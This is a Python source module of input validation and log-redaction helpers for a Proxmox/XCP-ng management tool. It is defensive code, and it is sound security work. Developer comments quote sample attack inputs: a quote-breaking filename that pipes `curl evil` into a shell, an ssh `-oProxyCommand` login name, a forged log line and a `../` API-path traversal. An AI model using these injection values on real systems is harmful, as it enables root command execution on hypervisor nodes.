# -*- coding: utf-8 -*-
"""
PegaProx Input Sanitization - Layer 2
"""

import logging
import re
import html

# NS: split from monolith - these were scattered all over the place before


def sanitize_string(value: str, max_length: int = 1000, allow_html: bool = False) -> str:
    """sanitize string input, escape html by default"""
    if not isinstance(value, str):
        value = str(value) if value is not None else ''
    
    # Truncate to max length
    value = value[:max_length]
    
    # Strip null bytes and other control characters (0x0b = vertical tab, 0x0c = form feed)
    # MK: the regex looks scary but its just ASCII C0 control chars minus \t \n \r
    value = re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]', '', value)
    
    # Escape HTML if not allowed
    if not allow_html:
        value = html.escape(value)
    
    return value.strip()


def sanitize_identifier(value: str, max_length: int = 64) -> str:
    """sanitize identifier - alphanumeric, underscore, hyphen, dot only"""
    if not isinstance(value, str):
        value = str(value) if value is not None else ''
    
    # Only allow safe characters
    value = re.sub(r'[^a-zA-Z0-9_\-\.]', '', value)
    
    return value[:max_length]


def sanitize_username(value: str, max_length: int = 64) -> str:
    """sanitize username — allows @ for email-style logins"""
    if not isinstance(value, str):
        value = str(value) if value is not None else ''
    value = re.sub(r'[^a-zA-Z0-9_\-\.@\+]', '', value)
    return value[:max_length]


def sanitize_int(value, default: int = 0, min_val: int = None, max_val: int = None) -> int:
    """Sanitize an integer input"""
    try:
        result = int(value)
        if min_val is not None and result < min_val:
            result = min_val
        if max_val is not None and result > max_val:
            result = max_val
        return result
    except (ValueError, TypeError):
        return default


def sanitize_bool(value, default: bool = False) -> bool:
    """Sanitize a boolean input"""
    if isinstance(value, bool):
        return value
    if isinstance(value, str):
        return value.lower() in ('true', '1', 'yes', 'on')
    if isinstance(value, int):
        return value != 0
    return default


# MK Sep 2026 - every anchored validator below ends in \Z, not $. In Python `$` also
# matches immediately BEFORE a trailing newline, so `re.match(r'^[a-z]+$', 'abc\n')` is a
# match and every one of these accepted a value with a newline glued to the end. Two of
# them gate values that reach a root shell on a PVE node unquoted, where a newline is a
# command terminator, and one gates a path segment we hand to the PVE API. Nothing
# legitimate here ever ends in a newline. \Z means the end of the string and only that.


def validate_email(email: str) -> bool:
    """Validate email format"""
    if not email or not isinstance(email, str):
        return False
    # Simple regex - not perfect but catches most issues
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\Z'
    return bool(re.match(pattern, email))


def validate_hostname(hostname: str) -> bool:
    """Validate hostname/IP format"""
    if not hostname or not isinstance(hostname, str):
        return False
    # Allow IP addresses and hostnames
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}\Z'
    hostname_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*\Z'
    return bool(re.match(ip_pattern, hostname) or re.match(hostname_pattern, hostname))


# MK Oct 2026 - what a task id of Proxmox VE or PBS looks like. It never holds a slash: the
# task log is a file of that name. The same check as manager.get_task_status.
UPID_RE = re.compile(r'UPID:[^/?#%\s]{1,400}')


def valid_upid(value) -> bool:
    return isinstance(value, str) and bool(UPID_RE.fullmatch(value))


def task_ref_ok(cluster_type, node, upid) -> bool:
    """A node and task reference of a cluster as they may go into an API path: for XCP-ng
    and ESXi a task reference without a slash, for any other a Proxmox VE node name and
    UPID (a type nobody named here gets the strict check, not the loose one)."""
    if cluster_type in ('xcpng', 'esxi'):
        return isinstance(upid, str) and bool(re.fullmatch(r'[^/?#%\s]{1,400}', upid))
    return validate_hostname(node) and valid_upid(upid)


def valid_pbs_upid(value) -> bool:
    """A PBS task id. PBS escapes its worker id ('store1\\x3avm-100'), but the routes have
    taken one with the slashes in since they exist, so a slash is let through here; a '.'
    or '..' segment, a query, a fragment or an escape is not."""
    if not isinstance(value, str) or not value.startswith('UPID:') or len(value) > 400:
        return False
    if any(c in value for c in '?#%') or any(c.isspace() for c in value):
        return False
    return not any(seg in ('.', '..') for seg in value.replace('\\', '/').split('/'))


def url_path_climbs(url) -> bool:
    """True when the path of `url` has a '.' or '..' segment, also percent-encoded or
    written with a backslash. requests folds those away before it sends, so a value put
    into an API path that carries one would reach another endpoint than the code names."""
    from urllib.parse import urlsplit, unquote
    try:
        path = urlsplit(str(url)).path
    except ValueError:
        return True
    return any(seg in ('.', '..') for seg in unquote(path).replace('\\', '/').split('/'))


def refuse_climbing_paths(session):
    """Wrap session.request so a URL whose path climbs (url_path_climbs) is refused with a
    ValueError before requests folds it. Returns the session."""
    if getattr(session, '_paths_checked', False):
        return session
    request = session.request

    def checked(method, url, *args, **kwargs):
        if url_path_climbs(url):
            raise ValueError('refused an API path with a . or .. segment')
        return request(method, url, *args, **kwargs)
    session.request = checked
    session._paths_checked = True
    return session


# NS Oct 2026 - an SSH login name goes onto the ssh/sshpass/scp command line and into
# shell strings run on the nodes. Starting with '-' it is an OpenSSH option there
# (-oProxyCommand=... runs a command on this host), so only what a POSIX login name
# can be: letters, digits, '_', '.', '-', not starting with '-' or '.'.
_SSH_USER_RE = re.compile(r'^[A-Za-z0-9_][A-Za-z0-9_.\-]{0,63}\Z')


def validate_ssh_user(value) -> bool:
    """True if `value` can be used as the remote login name of an SSH connection.
    Empty is rejected; callers that mean "the default user" decide that first."""
    if not value or not isinstance(value, str):
        return False
    return bool(_SSH_USER_RE.match(value))


# a little wider than validate_hostname: '_' turns up in internal names
_HOST_NAME_RE = re.compile(r'^[A-Za-z0-9_][A-Za-z0-9_.\-]{0,252}\Z')


def validate_host_address(value) -> bool:
    """True for a host name, an IPv4 or an IPv6 address (bracketed or not) and nothing
    else: no scheme, user, port, path, whitespace or leading '-'."""
    import ipaddress
    if not value or not isinstance(value, str):
        return False
    if _HOST_NAME_RE.match(value):
        return True
    bare = value[1:-1] if value.startswith('[') and value.endswith(']') else value
    try:
        ipaddress.ip_address(bare)
        return True
    except ValueError:
        return False


# one DNS label: letters, digits and inner hyphens, at most 63 characters
_DNS_LABEL_RE = re.compile(r'[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?\Z')


def dns_suffix(value):
    """`value` as a DNS suffix, without surrounding space and dots ('' when empty), or
    None when it is no string or anything but labels of letters, digits and hyphens
    separated by dots. The node UI suffix of a cluster is one."""
    if not isinstance(value, str):
        return None
    value = value.strip().strip('.')
    if value and (len(value) > 253 or not all(_DNS_LABEL_RE.match(label) for label in value.split('.'))):
        return None
    return value


def validate_storage_name(storage) -> bool:
    """Validate Proxmox / XCP-ng storage identifier.

    PVE/XCP storage names are alphanumeric + dash + underscore + dot. Anything
    outside that set has no legitimate use in our context and reaching us is a
    sign of an injection attempt against the `pvesm` / `qm` shell calls that
    embed the storage name. MK May 2026 (Aikido #481 port — original PR was
    closed-superseded by mistake; manually ported after re-review.)
    """
    if not storage or not isinstance(storage, str):
        return False
    # Must start with alphanumeric, 1-100 chars total, set: [A-Za-z0-9._-]
    pattern = r'^[a-zA-Z0-9][a-zA-Z0-9_\-\.]{0,99}\Z'
    return bool(re.match(pattern, storage))


# NS Jul 2026 (pentest CRIT) — ISO/template filenames flow UNESCAPED into SSH
# shell commands on PVE nodes (sync_content_to_nodes: `test -f '<path>/<filename>'`,
# scp/sftp relay). They are only single-quoted, so a filename containing a quote
# (`x'; curl evil|sh; echo '`) breaks out → root RCE on every node, reachable by a
# low-priv storage.upload holder. A PVE ISO/vztmpl filename is a single path
# component of [A-Za-z0-9._+-] (e.g. debian-12.iso, ubuntu_22.04-1_amd64.tar.zst) —
# reject anything else (no '/', no spaces, no shell metachars) and fail closed.
_CONTENT_FILENAME_RE = re.compile(r'^[A-Za-z0-9][A-Za-z0-9._+\-]{0,254}\Z')

def validate_content_filename(value) -> bool:
    """True if `value` is a safe single ISO/template filename for the content-sync
    shell path (one component, no '/'/space/shell-metachars). Empty → False."""
    if not value or not isinstance(value, str):
        return False
    return bool(_CONTENT_FILENAME_RE.match(value))


# NS 2026-06-05 (security audit C-2/M-2): ESXi datastore names and VM-directory
# names flow UNQUOTED into root shell commands on the PVE node (sshfs mounts,
# qemu-img, find). VMware allows letters/digits/space and a small punctuation
# set in these; a single component never contains '/'. Anything with shell
# metacharacters (; | & $ ` < > newlines quotes backslash) or a slash is an
# injection attempt against the V2P shell pipeline — reject it hard, fail closed.
_ESXI_NAME_RE = re.compile(r'^[A-Za-z0-9][A-Za-z0-9 ._()+\-]{0,127}\Z')

def validate_esxi_path_component(value) -> bool:
    """True if `value` is a safe single ESXi datastore / directory name.

    NOT a full path — one path component only (no '/'). Used to gate the
    user-supplied esxi_datastore / esxi_vm_dir before they reach the V2P
    SSHFS + qemu-img shell calls. Empty is rejected; callers that allow
    auto-detect must check for empty BEFORE calling this.
    """
    if not value or not isinstance(value, str):
        return False
    return bool(_ESXI_NAME_RE.match(value))


# NS Oct 2026 (#1090) - virtio_iso_path is loop-mounted by root on the PVE node. Any node
# path was taken, so a disk image or another file could be mounted in the ISO's place.
_NODE_ISO_PATH_RE = re.compile(r'/[A-Za-z0-9 ._()+\-/]{0,4090}\.iso\Z', re.IGNORECASE)

def validate_node_iso_path(value) -> bool:
    """True for an absolute path to an .iso file: no '..' part, no control characters."""
    if not isinstance(value, str) or not _NODE_ISO_PATH_RE.match(value):
        return False
    return '..' not in value.split('/')


# MK Sep 2026 (audit CRIT) — a snapshot name goes straight into the PVE API path
# (.../{vmid}/snapshot/{snapname}), and the authz gate in front of those routes only ever
# validates the vmid. So a name carrying dot-segments walked out of the guest the caller owns
# and reached arbitrary PVE endpoints as the cluster's stored root ticket — five `../` from
# the snapshot path lands on /access/users, and the verb is DELETE. The portal grew a private
# copy of this check when the same bug was found there; the dashboard twins never got it, so
# it lives here now and the sinks in manager.py enforce it for every caller.
# PVE's own snapshot-name rule is [A-Za-z][A-Za-z0-9_-]*, so nothing legitimate is refused.
_SNAPSHOT_NAME_RE = re.compile(r'^[A-Za-z][A-Za-z0-9_\-]{0,62}\Z')


def validate_snapshot_name(value) -> bool:
    """True if `value` is a legitimate PVE snapshot name (one path segment, no dot-segments).

    Empty is rejected; a caller that means "the running config" must check for PVE's synthetic
    'current' before calling this."""
    if not value or not isinstance(value, str):
        return False
    return bool(_SNAPSHOT_NAME_RE.match(value))


# MK Sep 2026 - SDN object ids arrive as a URL path segment and are then interpolated into
# the PVE API path, which we speak with the cluster's stored root credential. requests
# resolves dot segments before it sends, so an id of ".." moves the whole PUT or DELETE one
# level up the SDN tree - the same shape as the snapshot-name traversal, caught earlier this
# time because the router will not pass a slash. Proxmox publishes the grammar itself
# (pve-sdn-vnet-id is [a-zA-Z][a-zA-Z0-9]*[a-zA-Z0-9]); dash and underscore are allowed here
# too so an id someone already created is not suddenly refused. A dot never is.
_SDN_ID_RE = re.compile(r'^[A-Za-z][A-Za-z0-9_\-]{0,62}\Z')


def validate_sdn_id(value) -> bool:
    """True if `value` is usable as a single PVE SDN path segment (zone, vnet, fabric,
    controller, ipam, dns). Rejects dot segments, empties and anything with a separator."""
    if not value or not isinstance(value, str):
        return False
    return bool(_SDN_ID_RE.match(value))


def sanitize_csv_field(value) -> str:
    """Sanitize field for CSV export to prevent formula injection.
    
    Neutralizes leading characters (=, +, -, @, tab, carriage return) that
    spreadsheet applications interpret as formula prefixes. Prepends a single
    quote to force literal interpretation while preserving the original value.
    
    References:
    - OWASP: https://owasp.org/www-community/attacks/CSV_Injection
    - CWE-1236: Improper Neutralization of Formula Elements in a CSV File
    """
    if value is None:
        return ''
    
    # Convert to string
    s = str(value)
    
    # Check if the field starts with a formula-triggering character
    # =, +, -, @ are the primary formula prefixes
    # \t (tab) and \r (carriage return) can also be exploited in some contexts
    if s and s[0] in ('=', '+', '-', '@', '\t', '\r'):
        # Prepend single quote to force literal interpretation
        # This is the recommended mitigation per OWASP guidance
        return "'" + s

    return s


# everything in C0 except tab, DEL, and the C1 range - ESC among them, which is what
# every ANSI sequence starts with
_CONTROL_CHARS_RE = re.compile(r'[\x00-\x08\x0b-\x0c\x0e-\x1f\x7f-\x9f]')
# half of a UTF-16 pair on its own: a client can send "\ud800" in JSON, and a UTF-8 log
# handler raises on it inside emit(), so the whole line was lost
_LONE_SURROGATE_RE = re.compile('[\ud800-\udfff]')


def sanitize_log_message(value) -> str:
    """Strip CR/LF from a value before writing it to the text audit log.

    Without this, an attacker who controls any audit field (e.g. submits a
    username containing `\\nAudit: admin - deleted_everything`) could inject
    a fake-looking log line and confuse anyone tailing the file. The DB
    record stores the unmodified value, so this only sanitises the text
    stream.

    CWE-117 / OWASP Log Injection.
    """
    if value is None:
        return ''
    # MK May 2026 - cheap str-replace, called on every audit log write.
    # Also strips the unicode line separators U+2028/U+2029 which some viewers
    # (and json.dumps without ensure_ascii) treat as newlines. Tab is left
    # alone (legitimate in some action strings).
    s = str(value)
    s = s.replace('\r', ' ').replace('\n', ' ')
    s = s.replace('\u2028', ' ').replace('\u2029', ' ')
    # MK Sep 2026 - and the rest of the control range. A name carrying \x1b[2K\r does not
    # just add a line, it rewrites what the operator sees in their terminal: erase the
    # line, move the cursor, repaint something else, set the window title. Stripping CR
    # and LF stopped the forged LINE and left the forged SCREEN. Tab stays: it is
    # legitimate in action strings and cannot move a cursor about.
    s = _CONTROL_CHARS_RE.sub(' ', s)
    return _LONE_SURROGATE_RE.sub('�', s)




def bounded_list(value, max_items=256, max_length=253, dedupe=True, name='list'):
    """A list that came out of a request body, bounded in both directions.

    Ten endpoints took a list from the caller, checked at most that it WAS a list, and
    persisted it: fallback hosts, excluded nodes, cluster reorder, affinity-rule members,
    multipath nodes, PBS cluster links, template metadata, pool members, VM tags. None of
    them bounded the item count or the item length, so one request could store a million
    entries of a megabyte each - durably, and then reload them into memory on every start.
    Duplicates matter too: several of these fan out one request per entry.

    Returns (cleaned, error). `error` is None when it is fine, otherwise a sentence for
    the 400. MK Sep 2026
    """
    if value is None:
        return [], None
    if not isinstance(value, (list, tuple)):
        return None, f'{name} must be a list'
    if len(value) > max_items:
        return None, f'{name} accepts at most {max_items} entries ({len(value)} given)'
    out, seen = [], set()
    for item in value:
        if item is None or isinstance(item, (dict, list, tuple, bool)):
            return None, f'{name} entries must be plain strings or numbers'
        text = str(item).strip()
        if not text:
            continue
        if len(text) > max_length:
            return None, f'{name} entries are limited to {max_length} characters'
        if dedupe:
            if text in seen:
                continue
            seen.add(text)
        out.append(text)
    return out, None


# Query parameters that carry a credential in practice. Matched case-insensitively
# against the parameter NAME, so `?api_key=` and `?X-Amz-Signature=` both go.
_SECRET_PARAM_HINTS = ('token', 'key', 'secret', 'password', 'passwd', 'pwd',
                       'sig', 'signature', 'credential', 'auth')


# Extra hints that only make sense for a MAPPING key, not for a URL query parameter.
# `target-endpoint` is PVE's remote-migration field and carries a full-rights API token
# inside its value; it matches none of the hints above, which is why folding the old
# per-key redaction in core/manager.py into the shared rule needed this line. Keeping them
# separate leaves redact_url()'s behaviour exactly as it was.
_SECRET_KEY_EXTRA_HINTS = ('endpoint', 'apitoken', 'bindpw', 'passphrase', 'privatekey')


def redact_secrets(mapping, _depth=0):
    """Return a copy of a mapping with credential-bearing values replaced.

    For the case where a handler wants to log a request body or a backend config
    whole. The storage-create route did exactly that at DEBUG level, and for a PBS
    or CIFS target that payload carries `password` verbatim — `--debug` is an
    ordinary thing to be running. core/manager.py had already been bitten by this
    once (a cleartext PVEAPIToken in a migration payload) and fixed it with a dict
    comprehension for the single key it knew about, which is why the storage route
    went on leaking: the fix was correct and reached one line.

    Key names are matched case-insensitively as substrings against
    _SECRET_PARAM_HINTS — the same list redact_url() applies to query parameters,
    so adding a hint covers every caller — plus _SECRET_KEY_EXTRA_HINTS for the
    field names that only ever appear as mapping keys. It over-matches slightly
    (PVE's `keyboard` contains `key`), which is the right direction for a log
    line. An empty or absent value is left alone so "not set" does not start
    reading as "set". A matching key is redacted whatever it holds, including a
    whole sub-mapping — `credentials: {...}` has already told you what is in
    there, and walking in to publish it a leaf at a time because the leaf names
    do not match would be the wrong way round. Sub-mappings under a NON-matching
    key are walked; other values pass through, so this is not a deep sanitiser —
    it is what you call instead of interpolating a dict into a format string. NS
    """
    if not isinstance(mapping, dict):
        return mapping
    if _depth > 4:
        return '***TRUNCATED***'
    out = {}
    for k, v in mapping.items():
        if any(h in str(k).lower() for h in _SECRET_PARAM_HINTS + _SECRET_KEY_EXTRA_HINTS):
            out[k] = '***REDACTED***' if v not in (None, '') else v
        elif isinstance(v, dict):
            out[k] = redact_secrets(v, _depth + 1)
        else:
            out[k] = v
    return out


def redact_url(value):
    """Make a URL safe to write into a log line.

    Eight findings said the same thing from different files: a URL gets logged when a
    request fails, and the URL is the credential. `https://user:pass@host/` keeps the
    password in netloc - urlsplit().netloc includes userinfo, which is how the SIEM TLS
    warning ended up printing one. A Slack or Teams webhook URL has no userinfo at all;
    the secret IS the path. And a pre-signed download URL carries it in the query.

    So all three go: userinfo, the query values of anything that looks like a secret,
    and any path beyond the first segment. Enough is left to tell which endpoint failed,
    which is what the operator reading the log actually needs.

    Anything that does not parse as a URL is returned unchanged - callers pass whole
    exception strings through here. MK Sep 2026
    """
    if not value:
        return value
    text = str(value)

    def _one(m):
        scheme, userinfo, host, rest = m.group(1), m.group(2), m.group(3), m.group(4) or ''
        out = f'{scheme}://'
        if userinfo:
            out += '[REDACTED]@'
        out += host
        path, sep, query = rest.partition('?')
        segments = [s for s in path.split('/') if s]
        if len(segments) > 1:
            # The first segment of a multi-segment path is structural - 'services' on a
            # Slack hook, 'api' on a Discord one - so keeping it says which endpoint
            # failed without giving anything away.
            out += '/' + segments[0] + '/[REDACTED]'
        elif segments:
            # MK Sep 2026 (follow-up) - a LONE segment is not structure, it is the whole
            # path, and for an ntfy topic that path is the credential: anyone holding
            # https://ntfy.sh/<topic> can publish to it and read it. The first version
            # kept segments[0] unconditionally and printed such a URL verbatim, which is
            # exactly the leak this function exists to stop. Nothing is learned from a
            # single segment anyway - the host already says which service it was.
            out += '/[REDACTED]'
        if sep:
            parts = []
            for pair in query.split('&'):
                name, eq, _val = pair.partition('=')
                if eq and any(h in name.lower() for h in _SECRET_PARAM_HINTS):
                    parts.append(f'{name}=[REDACTED]')
                else:
                    parts.append(pair)
            out += '?' + '&'.join(parts)
        return out

    # the login runs to the last '@' before the path, as the fetcher reads it: a password
    # with an '@' in it otherwise left its tail in the line as the host
    return re.sub(
        r'(https?)://(?:([^/?#\s\'"<>]+)@)?([A-Za-z0-9_.\-:\[\]]+)([^\s\'"<>]*)',
        _one, text)


def url_without_login(url):
    """A single URL (not a log text) with its user:password@ taken off.

    redact_url() reads free text, so a login there ends at a blank. A typed URL is split
    the way the fetcher splits it: the netloc runs to the first '/', '?' or '#', the host
    is what follows its last '@'. Pass the result on to redact_url() for the path and the
    query."""
    if not url:
        return url
    from urllib.parse import urlsplit, urlunsplit
    try:
        p = urlsplit(str(url))
    except ValueError:
        return '[REDACTED]'
    if '@' not in p.netloc:
        return str(url)
    return urlunsplit(p._replace(netloc=p.netloc.rpartition('@')[2]))


# the login of an http(s) URL in a line: up to its last '@' before the path, or, with a
# blank in it, up to an '@' that a host and a path follow
_URL_LOGIN = re.compile(
    r'''(https?://)(?:[^/?#\s'"<>]+@|[^/?#'"<>]*@(?=[A-Za-z0-9_.\-:\[\]]+[/?#]))''')


def mask_url_logins(text):
    """`text` with the user:password@ of each http(s) URL in it as [REDACTED]@.

    For a line shown whole, a task log line say, where redact_url() would take the
    path and the query as well."""
    if not text or not isinstance(text, str) or '@' not in text:
        return text
    return _URL_LOGIN.sub(r'\1[REDACTED]@', text)


def redact_request_line(line):
    """An access-log line with credential-looking query values blanked.

    redact_url() wants a scheme and so never matches `POST /x?token=... HTTP/1.1`.
    Some callers can only send a credential in the query string (an auto-installer
    ISO too old for a header token), and the request line is logged at INFO."""
    if not isinstance(line, str) or '?' not in line:
        return line

    def _query(m):
        parts = []
        for pair in m.group(1).split('&'):
            name, eq, _val = pair.partition('=')
            if eq and any(h in name.lower() for h in _SECRET_PARAM_HINTS):
                parts.append(f'{name}=[REDACTED]')
            else:
                parts.append(pair)
        return '?' + '&'.join(parts)

    return re.sub(r'\?([^\s"#]*)', _query, line)


# MK Nov 2026 - the HTTP handlers of XAPI (import_raw_vdi, export_raw_vdi, rrd_updates)
# take the session in the query string, and the session is the pool login until XCP-ng
# drops it. requests names the url of a call that fails in its exception text, encoded
# (session_id=OpaqueRef%3A...) once requests or urlencode built the query, and urllib3
# logs every request line with it at DEBUG. The value ends where the url ends: blank,
# & (%26 in a url inside a url) or the quote or bracket a urllib3 message or a repr puts
# around it. The dict form ('session_id': 'OpaqueRef:...') needs the quote on the value,
# a keyword repr (session_id='...') may have one, and with blanks around the = or a bare
# colon the value has to be an OpaqueRef, so prose and a line of code stay as they are.
_SESSION_ID_RE = re.compile(
    r'''(session_id(?:=['"]?|%3D|['"]?\s*:\s*['"]|\s*[:=]\s*['"]?(?=OpaqueRef)))'''
    r'''(?:(?!%26)[^&\s'"()\[\]<>,;\\])+''', re.IGNORECASE)


def scrub_session_id(text):
    """`text` with the value of every session_id written as ***.

    The rest stays, so a failed call still says which handler it was and how it failed.
    Takes anything (an exception too) and returns its text; None and '' come back as
    they are."""
    if text is None:
        return None
    text = str(text)
    if not text:
        return text
    return _SESSION_ID_RE.sub(r'\1***', text)


def _names_a_session(exc):
    """Whether a traceback of exc shows a session_id: its own text or the text of an
    exception it was raised from or while handling, as the traceback prints them."""
    todo, seen = [exc], set()
    while todo and len(seen) < 10:
        e = todo.pop()
        if e is None or id(e) in seen:
            continue
        seen.add(id(e))
        try:
            if _SESSION_ID_RE.search(str(e)):
                return True
        except Exception:
            pass    # the traceback prints <exception str() failed> for this one
        todo.extend((getattr(e, '__cause__', None), getattr(e, '__context__', None)))
    return False


class LogInjectionFilter(logging.Filter):
    """Neutralise control characters on every log record, at the sink.

    Fourteen findings named fourteen files for the same thing: a name, a URL, an error
    string the caller chose ends up in a log line, and CR/LF lets them forge a line
    while ESC lets them repaint the operator's terminal. Wrapping the call sites means
    seventy-five edits and a seventy-sixth that somebody forgets next month, so this
    sits on the root logger instead and covers the ones written after today too.

    Deliberately only `msg` and `args`. A traceback arrives through exc_info and is
    appended by the formatter afterwards, so it keeps its newlines - it is ours, not
    the caller's, and an unreadable traceback helps nobody. MK Sep 2026
    """

    def filter(self, record):
        if isinstance(record.msg, str):
            record.msg = sanitize_log_message(record.msg)
        if record.args:
            if isinstance(record.args, dict):
                record.args = {k: (sanitize_log_message(v) if isinstance(v, str) else v)
                               for k, v in record.args.items()}
            elif isinstance(record.args, tuple):
                record.args = tuple(sanitize_log_message(a) if isinstance(a, str) else a
                                    for a in record.args)
        return True


def install_log_injection_filter(logger=None):
    """Attach the filter to a logger's handlers (root by default). Idempotent.

    Covers only the handlers that exist WHEN IT RUNS - see
    install_log_record_sanitizer() for why that was not enough.
    """
    target = logger if logger is not None else logging.getLogger()
    for handler in target.handlers:
        if not any(isinstance(f, LogInjectionFilter) for f in handler.filters):
            handler.addFilter(LogInjectionFilter())
    return target


_RECORD_FACTORY_INSTALLED = False


def install_log_record_sanitizer():
    """Neutralise control characters when the record is BUILT, not when it is handled.

    MK Sep 2026 (follow-up) - the handler filter above was meant to be "at the sink
    instead of at seventy-five call sites", and it missed a sink. A logging Filter lives
    on a HANDLER, and install_log_injection_filter() walks the handlers that exist at the
    moment it runs. core/manager.py and core/xcpng.py give every cluster its own logger
    with its own file and console handler, added when that cluster is constructed - long
    after startup. Those handlers carry no filter, and a cluster logger emits through its
    own handlers BEFORE propagating to root, so the per-cluster log file got the raw line
    while the main log got the clean one. Measured, not assumed: a VM rename containing
    CR/LF produced a forged, correctly-timestamped line in the cluster file.

    The record factory runs once per record, before any handler or propagation, so it
    covers every logger in the process including ones added later. Chains whatever
    factory is already installed rather than replacing it, and is idempotent.

    Same deliberate scope as the filter: `msg` and `args` only. A traceback arrives via
    exc_info and is rendered by the formatter, so it keeps its newlines. The one thing a
    traceback loses here is an XAPI session (scrub_session_id), see below.
    """
    global _RECORD_FACTORY_INSTALLED
    if _RECORD_FACTORY_INSTALLED:
        return
    previous = logging.getLogRecordFactory()

    def _sanitising_factory(*args, **kwargs):
        record = previous(*args, **kwargs)
        if isinstance(record.msg, str):
            record.msg = sanitize_log_message(record.msg)
        if record.args:
            if isinstance(record.args, dict):
                record.args = {k: (sanitize_log_message(v) if isinstance(v, str) else v)
                               for k, v in record.args.items()}
            elif isinstance(record.args, tuple):
                record.args = tuple(sanitize_log_message(a) if isinstance(a, str) else a
                                    for a in record.args)

        # MK Sep 2026 (follow-up) - sanitising msg and args covers str values and nothing
        # else, and the most common thing we log is not a str: `logging.error("...: %s", e)`
        # passes the EXCEPTION, and str(e) carries whatever a remote server put in its error
        # text. Measured: that forged a line straight through both this factory and the
        # handler filter. Rendering is the one place where msg and args become text
        # regardless of their types, so clean the rendered result too. It happens after %
        # formatting, so a %d with an int still formats as an int; exc_info is appended by
        # the formatter afterwards, so tracebacks keep their newlines.
        _render = record.getMessage

        # MK Nov 2026 - and an XAPI session in a url (scrub_session_id). The per-cluster
        # XCPng_<name> loggers and urllib3's request lines in --debug reach no filter of
        # their own, this runs for both.
        def _clean_render(_r=_render):
            return scrub_session_id(sanitize_log_message(_r()))

        record.getMessage = _clean_render

        # logger.exception: the traceback shows the exception text again, and the text of
        # each exception it was raised from or while handling. Rendered here only when one
        # of those names a session: every other traceback is rendered once, by the
        # handler's formatter, with a formatException of its own if it has one. Newlines
        # stay.
        if record.exc_info and not record.exc_text:
            try:
                if _names_a_session(record.exc_info[1]):
                    record.exc_text = scrub_session_id(
                        logging.Formatter().formatException(record.exc_info))
            except Exception:
                pass
        return record

    logging.setLogRecordFactory(_sanitising_factory)
    _RECORD_FACTORY_INSTALLED = True
